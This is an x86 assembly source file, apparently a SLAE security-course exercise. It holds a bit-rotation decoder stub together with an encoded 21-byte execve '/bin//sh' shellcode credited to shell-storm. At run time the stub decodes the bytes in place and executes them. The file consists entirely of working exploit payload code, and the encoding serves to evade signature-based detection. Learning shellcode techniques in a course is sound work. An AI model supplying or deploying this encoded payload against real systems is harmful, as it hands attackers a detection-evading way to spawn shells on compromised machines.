; Simple bit rotation shellcode decoder
; by Daniel Roberson -- SLAE 877
;

BITS 32


jmp shellcode

decode:
	pop esi          ; pointer for shellcode
	push esi         ; save pointer for the future
	xor ecx, ecx     ; set counter to zero

loop:
	mov al, [esi]    ; get 1 byte of shellcode
	ror al, 4        ; rotate 4 bits
	mov [esi], al    ; save rotated byte
	inc esi          ; advance string 1 byte
	inc ecx          ; counter
	cmp ecx, len     ; check if we've reached the end of shellcode
	jne loop

	call [esp]       ; execute decoded shellcode	


; rotated by 4 bits (simply swap the hex around. ex: 0x12 -> 0x21)
; Tiny Execve sh by Geyslan G. Bem -- 21 bytes
; http://shell-storm.org/shellcode/files/shellcode-841.php
shellcode:
	call decode
	encoded: db 0x13,0x9c,0x7f,0x1e,0x0b,0xb0,0x15,0x86,0xf2,0xf2,0x37,0x86,0x86,0xf2,0x26,0x96,0xe6,0x98,0x3e,0xdc,0x08
	len equ $-encoded

